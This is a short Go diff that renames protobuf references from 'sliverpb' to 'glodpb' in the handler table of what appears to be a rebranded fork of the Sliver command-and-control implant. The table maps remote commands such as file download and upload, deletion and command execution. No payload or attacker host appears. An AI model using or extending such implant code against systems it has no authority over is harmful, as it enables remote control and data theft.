@@ -28,26 +28,26 @@ package handlers
 
 import (
 	"os"
-	"github.com/starkzarn/glod/protobuf/sliverpb"
+	"github.com/starkzarn/glod/protobuf/glodpb"
 )
 
 var (
 	genericHandlers = map[uint32]RPCHandler{
-		sliverpb.MsgPing:           pingHandler,
-		sliverpb.MsgLsReq:          dirListHandler,
-		sliverpb.MsgDownloadReq:    downloadHandler,
-		sliverpb.MsgUploadReq:      uploadHandler,
-		sliverpb.MsgCdReq:          cdHandler,
-		sliverpb.MsgPwdReq:         pwdHandler,
-		sliverpb.MsgRmReq:          rmHandler,
-		sliverpb.MsgMkdirReq:       mkdirHandler,
-		sliverpb.MsgMvReq:          mvHandler,
-		sliverpb.MsgExecuteReq:     executeHandler,
-		sliverpb.MsgSetEnvReq:      setEnvHandler,
-		sliverpb.MsgEnvReq:         getEnvHandler,
-		sliverpb.MsgUnsetEnvReq:    unsetEnvHandler,
-		sliverpb.MsgReconfigureReq: reconfigureHandler,
-		sliverpb.MsgChtimesReq:     chtimesHandler,
+		glodpb.MsgPing:           pingHandler,
+		glodpb.MsgLsReq:          dirListHandler,
+		glodpb.MsgDownloadReq:    downloadHandler,
+		glodpb.MsgUploadReq:      uploadHandler,
+		glodpb.MsgCdReq:          cdHandler,
+		glodpb.MsgPwdReq:         pwdHandler,
+		glodpb.MsgRmReq:          rmHandler,
+		glodpb.MsgMkdirReq:       mkdirHandler,
+		glodpb.MsgMvReq:          mvHandler,
+		glodpb.MsgExecuteReq:     executeHandler,
+		glodpb.MsgSetEnvReq:      setEnvHandler,
+		glodpb.MsgEnvReq:         getEnvHandler,
+		glodpb.MsgUnsetEnvReq:    unsetEnvHandler,
+		glodpb.MsgReconfigureReq: reconfigureHandler,
+		glodpb.MsgChtimesReq:     chtimesHandler,
 	}
 )
 
